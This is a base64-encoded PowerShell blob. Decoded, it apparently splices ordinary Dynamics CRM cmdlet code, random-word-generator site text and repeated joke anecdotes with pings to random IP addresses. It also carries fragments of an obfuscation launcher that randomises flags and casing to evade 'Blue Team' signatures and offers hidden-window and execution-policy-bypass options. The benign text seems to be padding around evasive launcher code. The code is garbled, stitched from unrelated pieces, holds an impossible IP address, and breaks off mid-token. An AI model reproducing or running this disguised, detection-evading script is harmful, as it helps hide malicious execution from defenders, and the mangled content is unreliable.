iAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTIsIFBhcmFtZXRlclNldE5hbWU9Ik5hbWVXaXRoSWQiKV0KICAgICAgICBbZ3VpZF0kSWQsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTMpXQogICAgICAgIFtzdHJpbmddJEFjdGl2aXR5RW50aXR5VHlwZSwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249NCldCiAgICAgICAgW3N0cmluZ10kU3ViamVjdCwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249NSldCiAgICAgICAgW3N0cmluZ10kRGVzY3JpcHRpb24sCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTYpXQogICAgICAgIFtzdHJpbmddJE9ud2VyVXNlcklkLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSwgUG9zaXRpb249NyldCiAgICAgICAgW2hhc2h0YWJsZV0kRmllbGRzCiAgICApCiAgICBiZWdpbgogICAgewogICAgICAgICRjb25uID0gVmVyaWZ5Q3JtQ29ubmVjdGlvblBhcmFtIC1jb25uICRjb25uIC1waXBlbGluZVZhbHVlICgkUFNCb3VuZFBhcmFtZXRlcnMuQ29udGFpbnNLZXkoJ2Nvbm4nKSkKICAgIH0gIAoJcHJvY2VzcwoJewoJCWlmKCRDcm1SZWNvcmQgLW5lICRudWxsKQoJCXsKCQkJJEVudGl0eUxvZ2ljYWxOYW1lID0gJENybVJlY29yZC5sb2dpY2FsbmFtZQoJCQkkSWQgPSAkQ3JtUmVjb3JkLigkRW50aXR5TG9naWNhbE5hbWUgKyAiaWQiKQoJCX0KCQkkbmV3ZmllbGRzID0gTmV3LU9iamVjdCAnU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuRGljdGlvbmFyeVtbU3RyaW5nXSwgW01pY3Jvc29mdC5Ycm0uVG9vbGluZy5Db25uZWN0b3IuQ3JtRGF0YVR5cGVXcmFwcGVyXV0nCgkJaWYoJEZpZWxkcyAtbmUgJG51bGwpCgkJewoJCQlmb3JlYWNoKCRmaWVsZCBpbiAkRmllbGRzLkdldEVudW1lcmF0b3IoKSkKCQkJeyAgCgkJCQkkbmV3ZmllbGQgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSAnTWljcm9zb2Z0LlhybS5Ub29saW5nLkNvbm5lY3Rvci5Dcm1EYXRhVHlwZVdyYXBwZXInCiAgICAgICAgICAgICAgICAkbmV3ZmllbGQuVHlwZSA9IE1hcEZpZWxkVHlwZUJ5RmllbGRWYWx1ZSAtVmFsdWUgJGZpZWxkLlZhbHVlCiAgICAgICAgICAgICAgICAkbmV3ZmllbGQuVmFsdWUgPSAkZmllbGQuVmFsdWUKICAgICAgICAgICAgICAgICRuZXdmaWVsZHMuQWRkKCRmaWVsZC5LZXksICRuZXdmaWVsZCkKICAgICAgICAgICAgfQoJCX0KCgkJdHJ5CgkJewoJCQkkcmVzdWx0ID0gJGNvbm4uQ3JlYXRlTmV3QWN0aXZpdHlFbnRyeSgkQWN0aXZpdHlFbnRpdHlUeXBlLCAkRW50aXR5TG9naWNhbE5hbWUsICRJZCwKICAgICAgICAgICAgICAgICRTdWJqZWN0LCAkRGVzY3JpcHRpb24sICRPbndlclVzZXJJZCwgJG5ld2ZpZWxkcywgW0d1aWRdOjpFbXB0eSkKCQkJaWYoJHJlc3VsdCAtZXEgJG51bGwpCgkJCXsKCQkJCXRocm93IExhc3RDcm1Db25uZWN0b3JFeGNlcHRpb24oJGNvbm4pCgkJCX0KCQl9CgkJY2F0Y2gKCQl7CgkJCXRocm93IExhc3RDcm1Db25uZWN0b3JFeGNlcHRpb24oJGNvbm4pCgkJfQoKCQlyZXR1cm4gJHJlc3VsdAoJfQp9CjwjPj4KU3A9ZWxsaW5nIGFuZCBWb2NhYnVsYXJ5ClRoaXMgdG9vbCBjYW4gYmUgYW4gZXhjZWxsZW50IHdheSB0byBpbXByb3ZlIHZvY2FidWxhcnkgb3IgcHJhY3RpY2UgZm9yIHIoKSBiZWVzLiBJZiBhbiBxKCkgd29yZCBvKCksIHAoKSB1cCB0aGUgbWVhbmluZyB3aWxsIGhlbHAgc3R1ZGVudHMgaW5jcmVhc2UgdGhlIG51bWJlciBvZiB3b3JkcyB0aGV5IGtub3cuIFdvcmtpbmcgd2l0aCBhIHBhcnRuZXIsIHN0dWRlbnRzIGNhbiB0ZXN0IGVhY2ggb3RoZXIgb24gdGhlIHIoKSBmb3IgdGhlIHJhbmRvbWl6ZWQgd29yZHMgbSgpZC4KCk5hbWUgSW5zcGlyYXRpb24KSWYgeW91IG5lZWQgdG8gY3JlYXRlIGEgbmFtZSBmb3IgYSBwcm9kdWN0LCBhbiBldmVudCwgYSBiYW5kIG9yIGZvciBhbnl0aGluZyBlbHNlLCB0aGlzIHRvb2wgY2FuIGJlIHF1aXRlIGhlbHBmdWwuIEFzIHlvdSBjb25zaWRlciBuYW1lcywgbSgpIGEgbnVtYmVyIG9mIHJhbmRvbSB3b3JkcyBhbmQgc2VlIGhvdyB0aGV5IGltcGFjdCB3aGF0IHlvdSBoYXZlIGFscmVhZHkgY29tZSB1cCB3aXRoLiBJbnB1dHRpbmcgdW5pcXVlIHdvcmRzIHlvdSBtYXkgbm90IGhhdmUgY29uc2lkZXJlZCBjYW4gc3BhcmsgYWRkaXRpb25hbCBjcmVhdGl2aXR5IHRvIGV2ZW50dWFsbHkgaGVscCB5b3UgcHJvZHVjZSB0aGUgcGVyZmVjdCBuYW1lIGZvciB5b3VyIHByb2plY3QuIElmIHlvdSdyZSBwKCkgZm9yIGdvb2QgY2hhcmFjdGVyIG5hbWVzIG9yIGJhYnkgbmFtZXMsIHlvdSBtaWdodCBiZSBpbnRlcmVzdGVkIGluIG91ciByYW5kb20gbmFtZSBnZW5lcmF0b3IuCgpUaGUgYWJvdmUgbGlzdCBpcyBub3QgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyguIFRoZXJlIGFyZSBsaXRlcmFsbHkgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyggb2Ygd2F5cyB0aGUgUmFuZG9tIFdvcmQgR2VuZXJhdG9yIGNhbiBiZSB1c2VkLiBQbGVhc2UgZmVlbCBmcmVlIHRvIHNoYXJlIHRoZSB3YXkgeW91IHVzZSB0aGlzIHRvb2wsIGFuZCB3ZSBhbHdheXMgd2VsY29tZSBzdWdnZXN0aW9ucyBvbiBob3cgd2UgY2FuIGltcHJvdmUgaXQgdG8gc2VydmUgeW91IGJldHRlci4gV2UgYXJlIGFsc28gaW50ZXJlc3RlZCBpbiBuZXcgd29yZCBnZW5lcmF0b3JzIHlvdSdkIGJlIGludGVyZXN0ZWQgaW4gdXMgY3JlYXRpbmcuIE1hbnkgb2YgdGhlIHRvb2xzIG9uIHRoaXMgd2Vic2l0ZSBjYW1lIGZyb20gaWRlYXMgZnJvbSBwZW9wbGUgbGlrZSB5b3Ugd2hvIGNvbnRhY3RlZCB1cy4gUGxlYXNlIHRha2UgdGhlIHRpbWUgdG8gZXhwbG9yZSB0aGUgb3RoZXIgcmFuZG9tIGdlbmVyYXRvcnMgd2UgaGF2ZSBhdmFpbAoKIz48Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSByZXN0cm9vbSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgcmVzdHJvb20gSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnEkgd2FzIGF0IGEgc3dhbmsgYmFyIGZvciBhIHdvcmsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygsIGUoKSBzb21lIGdyYWQgc3R1ZGVudHMgd2UgaigpIGZvciBhbiBoKCkgcHJvZ3JhbS4gQWZ0ZXIgd2UgaGFkIGFsbCBoYWQgaygpIGRyaW5rcywgb25lIG9mIHRoZSBzdHVkZW50cyBzYWlkIHRoZXkgZG9udCBsaWtlIHNtb2tlcyBiZWNhdXNlIHRoZXkgdGFzdGUgbGlrZSBhLiBNeSBib3NzIHJlcGxpZWQsIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2Qgc21va2VzLiBTbyBJIGN1dCBpbiwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBhLiBJIHdhcyBhc2tlZCB0byBsZWF2ZS7igJ1Tb3VyY2UjPgo8I1RoYXRzIGcoKSBPbmUgdGltZSBJIGF0ZSAyNiBjaG9jb2xhdGUgY2hpcCBpKCkgYmVjYXVzZSBJIHdhcyBtYWQgYXQgbXkgbGl0dGxlIGwoKSBhbmQgZGlkbnQgd2FudCBoZXIgdG8gaGF2ZSBhbnkuIEkgcHVrZWQgYWxsIG92ZXIgdGhlIHBsYWNlLuKAnSBTb3VyY2UjPgo8I+KAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIHJlc3Ryb29tIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgpmdW5jdGlvbiBtewoKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQQVJBTSgKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UpXQogICAgICAgIFtNaWNyb3NvZnQuWHJtLlRvb2xpbmcuQ29ubmVjdG9yLkNybVNlcnZpY2VDbGllbnRdJGNvbm4sCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTEsIFBhcmFtZXRlclNldE5hbWU9IkNybVJlY29yZCIpXQogICAgICAgIFtQU09iamVjdF0kQ3JtUmVjb3JkMSwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249MiwgUGFyYW1ldGVyU2V0TmFtZT0iQ3JtUmVjb3JkIildCiAgICAgICAgW1BTT2JqZWN0XSRDcm1SZWNvcmQyLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0xLCBQYXJhbWV0ZXJTZXROYW1lPSJOYW1lV2l0aElkIildCiAgICAgICAgW3N0cmluZ10kRW50aXR5TG9naWNhbE5hbWUxLAogICAgICAgIFtwYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQb3NpdGlvbj0yLCBQYXJhbWV0ZXJTZXROYW1lPSJOYW1lV2l0aElkIildCiAgICAgICAgW2d1aWRdJElkMSwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249MywgUGFyYW1ldGVyU2V0TmFtZT0iTmFtZVdpdGhJZCIpXQogICAgICAgIFtzdHJpbmddJEVudGl0eUxvZ2ljYWxOYW1lMiwKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kdHJ1ZSwgUG9zaXRpb249NCwgUGFyYW1ldGVyU2V0TmFtZT0iTmFtZVdpdGhJZCIpXQogICAgICAgIFtndWlkXSRJZDIsCiAgICAgICAgW3BhcmFtZXRlcihNYW5kYXRvcnk9JHRydWUsIFBvc2l0aW9uPTUpXQogICAgICAgIFtzdHJpbmddJFJlbGF0aW9uc2hpcE5hbWUKICAgICkKCSRjb25uID0gVmVyaWZ5Q3JtQ29ubmVjdGlvblBhcmFtIC1jb25uICRjb25uIC1waXBlbGluZVZhbHVlICgkUFNCb3VuZFBhcmFtZXRlcnMuQ29udGFpbnNLZXkoJ2Nvbm4nKSkgICAgCiAgICBpZigkQ3JtUmVjb3JkMSAtbmUgJG51bGwpCiAgICB7CiAgICAgICAgJEVudGl0eUxvZ2ljYWxOYW1lMSA9ICRDcm1SZWNvcmQxLmxvZ2ljYWxuYW1lCiAgICAgICAgJElkMSA9ICRDcm1SZWNvcmQxLigkRW50aXR5TG9naWNhbE5hbWUxICsgImlkIikKICAgIH0KICAgIGlmKCRDcm1SZWNvcmQyIC1uZSAkbnVsbCkKICAgIHsKICAgICAgICAkRW50aXR5TG9naWNhbE5hbWUyID0gJENybVJlY29yZDIubG9naWNhbG5hbWUKICAgICAgICAkSWQyID0gJENybVJlY29yZDIuKCRFbnRpdHlMb2dpY2FsTmFtZTIgKyAiaWQiKQogICAgfQogICAgdHJ5CiAgICB7CgkJJERpc2Fzc29jaWF0ZVJlcXVlc3QgPSBbTWljcm9zb2Z0LlhybS5TZGsuTWVzc2FnZXMuRGlzYXNzb2NpYXRlUmVxdWVzdF06Om5ldygpOwoJCSREaXNhc3NvY2lhdGVSZXF1ZXN0LlRhcmdldCA9IFtNaWNyb3NvZnQuWHJtLlNkay5FbnRpdHlSZWZlcmVuY2VdOjpuZXcoJEVudGl0eUxvZ2ljYWxOYW1lMSwkSWQxKTsKCQkkRGlzYXNzb2NpYXRlUmVxdWVzdC5SZWxhdGlvbnNoaXAgPSAkUmVsYXRpb25zaGlwTmFtZTsKCgkJJFJlbGF0ZWRFbnRpdHlSZWZlcmVuY2UgPSBbU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMuTGlzdFtNaWNyb3NvZnQuWHJtLlNkay5FbnRpdHlSZWZlcmVuY2VdXTo6bmV3KCkKCQkkUmVsYXRlZEVudGl0eVJlZmVyZW5jZS5BZGQoKFtNaWNyb3NvZnQuWHJtLlNkay5FbnRpdHlSZWZlcmVuY2VdOjpuZXcoJEVudGl0eUxvZ2ljYWxOYW1lMiwkSWQyKSkpCgkJJFJlbGF0ZWRFbnRpdHlDb2xsZWN0aW9uID0gW01pY3Jvc29mdC5Ycm0uU2RrLkVudGl0eVJlZmVyZW5jZUNvbGxlY3Rpb25dOjpuZXcoJFJlbGF0ZWRFbnRpdHlSZWZlcmVuY2UpCgkJJERpc2Fzc29jaWF0ZVJlcXVlc3QuUmVsYXRlZEVudGl0aWVzID0gJFJlbGF0ZWRFbnRpdHlDb2xsZWN0aW9uCgoJCSRyZXN1bHQgPSAkY29ubi5FeGVjdXRlKCREaXNhc3NvY2lhdGVSZXF1ZXN0KQoKCQlpZighJHJlc3VsdCkKICAgICAgICB7CiAgICAgICAgICAgIHRocm93IExhc3RDcm1Db25uZWN0b3JFeGNlcHRpb24oJGNvbm4pCiAgICAgICAgfQogICAgfQogICAgY2F0Y2gKICAgIHsKICAgICAgICB0aHJvdyBMYXN0Q3JtQ29ubmVjdG9yRXhjZXB0aW9uKCRjb25uKQogICAgfQp9CiAgICBQaW5nICIkKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwKS4kKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwMCkuJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMDApLiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDApIiAtbiAxO1BpbmcgIiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDApLiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDAwKS4kKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwMCkuJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMCkiIC1uIDE7UGluZyAiJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMCkuJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMDApLiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDAwKS4kKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwKSIgLW4gMTtQaW5nICIkKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwKS4kKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwMCkuJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMDApLiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDApIiAtbiAxO1BpbmcgIiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDApLiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDAwKS4kKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwMCkuJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMCkiIC1uIDE7UGluZyAiJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMCkuJChHZXQtUmFuZG9tIC1NaW5pbXVtIDEwIC1NYXhpbXVtIDEwMDApLiQoR2V0LVJhbmRvbSAtTWluaW11bSAxMCAtTWF4aW11bSAxMDAwKS4kKEdldC1SYW5kb20gLU1pbmltdW0gMTAgLU1heGltdW0gMTAwKSIgLW4gMTsKCiRlVmV6UldmYXU1NnFNRVpCdjI2cEIgPSBAIiAKICAgICAgICAgICAgRm9yKCRJbmRleD0zOyAkSW5kZXggLWxlICRGdWxsQXJndW1lbnQuTGVuZ3RoOyAkSW5kZXgrKykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEV4ZWN1dGlvblBvbGljeUZsYWdzICs9ICRGdWxsQXJndW1lbnQuU3ViU3RyaW5nKDAsJEluZGV4KQogICAgICAgICAgICB9CiAgICAgICAgICAgICRFeGVjdXRpb25Qb2xpY3lGbGFnID0gR2V0LVJhbmRvbSAtSW5wdXQgJEV4ZWN1dGlvblBvbGljeUZsYWdzCiAgICAgICAgICAgICRQb3dlclNoZWxsRmxhZ3MgKz0gJEV4ZWN1dGlvblBvbGljeUZsYWcgKyAnICcqKEdldC1SYW5kb20gLU1pbmltdW0gMSAtTWF4aW11bSAzKSArICRBcmd1bWVudFZhbHVlCiAgICAgICAgfQogICAgICAgIAogICAgICAgIAogICAgICAgICMgUmFuZG9taXplIHRoZSBvcmRlciBvZiB0aGUgZXhlY3V0aW9uIGZsYWdzLgogICAgICAgICMgVGhpcyBpcyB0byBwcmV2ZW50IHRoZSBCbHVlIFRlYW0gZnJvbSBwbGFjaW5nIGZhbHNlIGhvcGUgaW4gc2ltcGxlIHNpZ25hdHVyZXMgZm9yIG9yZGVyaW5nIG9mIHRoZXNlIGZsYWdzLgogICAgICAgIElmKCRDb21tYW5kbGluZU9wdGlvbnMuQ291bnQgLWd0IDEpCiAgICAgICAgewogICAgICAgICAgICAkQ29tbWFuZGxpbmVPcHRpb25zID0gR2V0LVJhbmRvbSAtSW5wdXRPYmplY3QgJENvbW1hbmRsaW5lT3B0aW9ucyAtQ291bnQgJENvbW1hbmRsaW5lT3B0aW9ucy5Db3VudAogICAgICAgIH0KCiAgICAgICAgIyBJZiBzZWxlY3RlZCB0aGVuIHRoZSAtQ29tbWFuZCBmbGFnIG5lZWRzIHRvIGJlIGFkZGVkIGxhc3QuCiAgICAgICAgSWYoJFBTQm91bmRQYXJhbWV0ZXJzWygnezN9eygoNCArIDEpIC0gMSl9eyg4IC0gMyl9eygxMCAtIDUpfXsoNyAtICgxICsgMCkpfXsoKDMgLSAyKSAtIDEpfXsoMiAtIDEpfSctZiduJywnZCcsJ20nLCdDJywnbycsJ20nLCdhJyldKQogICAgICAgIHsKICAgICAgICAgICAgJEZ1bGxBcmd1bWVudCA9ICh0M0k5dDVlamlCeG0xZE55ZTNtRWZjNXMwaWVwMXVvMmYoJy1Db21tYW5kJykpCiAgICAgICAgICAgICRDb21tYW5kbGluZU9wdGlvbnMgKz0gJEZ1bGxBcmd1bWVudC5TdWJTdHJpbmcoMCwoR2V0LVJhbmRvbSAtTWluaW11bSAyIC1NYXhpbXVtICgkRnVsbEFyZ3VtZW50Lkxlbmd0aCsxKSkpCiAgICAgICAgfQoKICAgICAgICAjJGVudjp0ZW1wCiAgICAjIFJhbmRvbWl6ZSB0aGUgY2FzZSBvZiBhbGwgY29tbWFuZC1saW5lIGFyZ3VtZW50cy4KICAgICAgICBGb3IoJGk9MDsgJGkgLWx0ICRQb3dlclNoZWxsRmxhZ3MuQ291bnQ7ICRpKyspCiAgICAgICAgewogICAgICAgICAgICAkUG93ZXJTaGVsbEZsYWdzWyRpXSA9IChbQ2hhcltdXSRQb3dlclNoZWxsRmxhZ3NbJGldIHwgRm9yRWFjaC1PYmplY3QgeyRDaGFyID0gJF8uVG9TdHJpbmcoKS5Ub0xvd2VyKCk7IElmKEdldC1SYW5kb20gLUlucHV0IEAoMC4uMSkpIHskQ2hhciA9ICRDaGFyLlRvVXBwZXIoKX0gJENoYXJ9KSAtSm9pbiAnJwogICAgICAgIH0KCiAgICAgICAgIyBSYW5kb20tc2l6ZWQgd2hpdGVzcGFjZSBiZXR3ZWVuIGFsbCBleGVjdXRpb24gZmxhZ3MgYW5kIGVuY2Fwc3VsYXRpbmcgZmluYWwgc3RyaW5nIG9mIGV4ZWN1dGlvbiBmbGFncy4KICAgICAgICAkQ29tbWFuZGxpbmVPcHRpb25zID0gKCRDb21tYW5kbGluZU9wdGlvbnMgfCBGb3JFYWNoLU9iamVjdCB7JF8gKyAnICcqKEdldC1SYW5kb20gLU1pbmltdW0gMSAtTWF4aW11bSAzKX0pIC1Kb2luICh0M2k5dDVlaklCWG0xRE55RTNtRWZjNXMwaWVQMVVPMmYoJycpKQogICAgICAgICRDb21tYW5kbGluZU9wdGlvbnMgPSAodDNpOVQ1RWppYnhNMWRueWUzbUVmQzVzMElFUDFVTzJmKCcgJykpKihHZXQtUmFuZG9tIC1NaW5pbXVtIDAgLU1heGltdW0gMykgKyAkQ29tbWFuZGxpbmVPcHRpb25zICsgJyAnKihHZXQtUmFuZG9tIC1NaW5pbXVtIDAgLU1heGltdW0gMykKCiJAICAgICAgICAgIAogICAgUGluZyA2OS4yMzUuNDIwLjEyIC1uIDEKJHE1eXlwdTd5ckN0ZyA9IEAiCiAgICAgICAgW1ZhbGlkYXRlU2V0KChXVUpKRXlDaWdDSUtXcmdsKCdOb3JtYWwnKSksICh3VUpKZVlDSUdDaUtXcmdMKCdNaW5pbWl6ZWQnKSksICh3dUpqRXlDSUdDaUt3cmdsKCdNYXhpbWl6ZWQnKSksIChXdWpKRVlDSUdjSUtXcmdsKCdIaWRkZW4nKSkpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJHR4eTd3eDczUywKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCh3VWpKRVlDaUdDSUt3UkdMKCdCeXBhc3M